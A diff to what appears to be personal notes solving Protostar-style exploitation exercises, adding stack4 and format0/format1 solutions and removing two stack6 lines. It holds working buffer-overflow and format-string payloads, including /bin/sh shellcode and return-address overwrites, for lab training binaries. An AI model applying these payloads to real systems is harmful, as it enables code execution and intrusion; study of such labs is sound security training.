@@ -22,6 +22,9 @@
     - [ret2Libc](#ret2libc)
     - [ret2Libc advanced](#ret2libc-advanced)
     - [misc](#misc)
+  - [format0: given the &target([ebp-0xc]) > &buffer([ebp-0x4c])](#format0-given-the-targetebp-0xc--bufferebp-0x4c)
+    - [format0 solution](#format0-solution)
+  - [format1](#format1)
 
 ## stack0
 
@@ -159,6 +162,8 @@ r <<< $(python3 -c "print('A' * (64 + int(0xb + 0x4)))"|xargs echo -en;echo -en 
 
 ```sh
 ./stack4 <<< $(python3 -c "print('A' * (64 + int(0xb + 0x1)))"|xargs echo -en;echo -en '\xf4\x83\x04\x08')
+./stack4 <<< $(python3 -c "import sys;sys.stdout.buffer.write(b'\x90' * (64 + int(0xb + 0x1)))"|xargs echo -en;echo -en '\xf4\x83\x04\x08')
+  # sys.stdout.buffer.write unprintable char test
 ```
 
 ## stack5: jmp esp
@@ -234,8 +239,6 @@ r <<< $(python3 -c "print('A' * 80 )"|xargs echo -en;echo -en '\xe0\x72\xe2\xf7A
 - `jmp esp` to the .text `ret`, then `jmp esp` again ho bypass the compiler check.
 
 ```sh
-r <<< $(python3 -c "print('\x90' * (80-19) + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x87\xe3\xb0\x0b\xcd\x80')"|xargs echo -en;echo -en '\xf9\x84\x04\x08\x10\x69\xa8\xff')
-r <<< $(python3 -c "print('\x90' * (80-19) + '')"|xargs echo -en;echo -en '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x87\xe3\xb0\x0b\xcd\x80';echo -en '\xf9\x84\x04\x08\x10\x69\xa8\xff');
   # $(python3 -c "import sys;sys.stdout.buffer.write(b'\x90')")
 
   # For the exam, use the clear-text payload.
@@ -248,7 +251,7 @@ r <<< $(echo -en '\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x
   # an alternative
 padding=$(for i in {0..61};do echo -en '\x90';done;)
 ret0=$(echo -en '\x7c\xff\xff\x0b';)
-ret1=$(echo -en '\x80\xff\xff\x0b';) # or not \x80 but (\x80 + <anyInt * 4>), then use NOP sled.
+ret1=$(echo -en '\x80\xff\xff\x0b';) # or substitute the \x80 with (\x80 + <anyInt * 4>), then use NOP sled.
 payload=$(echo -en '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x87\xe3\xb0\x0b\xcd\x80')
 ./stack6 <<< $(echo -en $padding; echo -en $ret0; echo -en $ret1; echo $payload)
 ```
@@ -334,3 +337,40 @@ x/s 0x7ffff7f745aa
 ```sh
 "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ"
 ```
+
+## format0: given the &target([ebp-0xc]) > &buffer([ebp-0x4c])
+
+- info:
+  + `int sprintf(char *str, const char *format, ...)` writes formatted output to a string buffer pointed by str().
+  + when result.length > str.length, buffer overflow.
+  + gdb, breakpoint before `cmp`
+
+```gdb
+b *vuln + 34
+  # 0x08048416 <+34>:    cmp    eax,0xdeadbeef
+x/64wx $esp
+
+r $(python3 -c "import sys;sys.stdout.buffer.write(b'A' * 64 + b'\xef\xbe\xad\xde')")
+  # for python2, use sys.stdout.write()
+```
+
+### format0 solution
+
+```sh
+./format0 $(python3 -c "import sys;sys.stdout.buffer.write(b'A' * 64 + b'\xef\xbe\xad\xde')")
+  # for python2, use sys.stdout.write()
+./format0 $(python3 -c "import sys;sys.stdout.buffer.write(b'%64s\xef\xbe\xad\xde')")
+```
+
+## format1
+
+```gdb
+p &target
+  # or objdump -t ./format1
+  # $1 = (int *) 0x8049638 <target>
+```
+
+- info:
+  + overwrite the `varargs` of `printf`, to &target, so that `printf('BBBB%n', &target)`, i.e., the `BBBB` overwrites `<target>`.
+
+
